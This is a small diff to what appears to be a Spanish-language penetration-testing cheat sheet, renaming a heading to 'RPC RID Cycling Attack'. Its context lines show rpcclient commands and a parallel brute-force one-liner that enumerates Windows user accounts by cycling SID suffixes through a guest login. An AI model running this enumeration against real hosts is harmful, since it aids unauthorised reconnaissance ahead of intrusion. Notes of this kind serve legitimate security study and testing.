@@ -100,7 +100,7 @@ rpcclient -U "gest%" <IP-TARGET> -c 'lookupnames Administrator'
 rpcclient -U "gest%" <IP-TARGET> -c 'lookupsids <SID>'
 ```
 
-#### Comando para Fuerza Bruta y conocer los usuarios que existen proporcioando el SID del usuario administrator y modificar los ulitmos digitos
+#### Comando para Fuerza Bruta y conocer los usuarios que existen proporcioando el SID del usuario administrator y modificar los ulitmos digitos (RPC RID Cycling Attack)
 ```
 seq 400 2000 | xargs -P 50 -I {} rpcclient -U "gest%" <IP-TARGET> -c 'lookupsids <SID>-{}' | grep -v unknown
 ```
